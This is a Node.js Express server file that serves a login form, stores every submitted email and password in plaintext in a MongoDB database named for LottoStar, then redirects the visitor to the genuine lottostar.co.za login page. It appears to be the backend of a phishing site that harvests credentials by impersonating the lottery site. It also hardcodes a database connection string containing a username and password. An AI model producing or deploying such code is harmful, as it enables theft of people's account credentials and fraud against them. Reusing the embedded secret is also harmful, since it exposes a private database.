const express = require("express");
const mongoose = require("mongoose");
const bodyParser = require("body-parser");
const path = require("path");

// Initialize app
const app = express();

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files (CSS, images, etc.) from 'public' folder
app.use(express.static(path.join(__dirname, "public")));

// MongoDB connection
mongoose
  .connect(
    "mongodb+srv://Jayden:GurrutoMari%401@lottostar.w8ss9.mongodb.net/lottostar?retryWrites=true&w=majority",
    {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    }
  )
  .then(() => {
    console.log("Connected to MongoDB");
  })
  .catch((err) => {
    console.error("Error connecting to MongoDB:", err.message);
  });

// Define a schema for user login details
const userSchema = new mongoose.Schema({
  username: String,
  password: String,
});

// Create a model
const User = mongoose.model("User", userSchema);

// Route to serve HTML form
app.get("/", (req, res) => {
  res.sendFile(__dirname + "/login.html");
});

// Route to handle form submission and redirect
app.post("/submit", async (req, res) => {
  try {
    const newUser = new User({
      email: req.body.email,
      password: req.body.password,
    });

    await newUser.save(); // Save user data to MongoDB

    // Redirect to the desired URL after successful submission
    res.redirect("https://lottostar.co.za/login?next=%2Faccount");
  } catch (err) {
    res.status(500).send("There was an error saving the data.");
  }
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
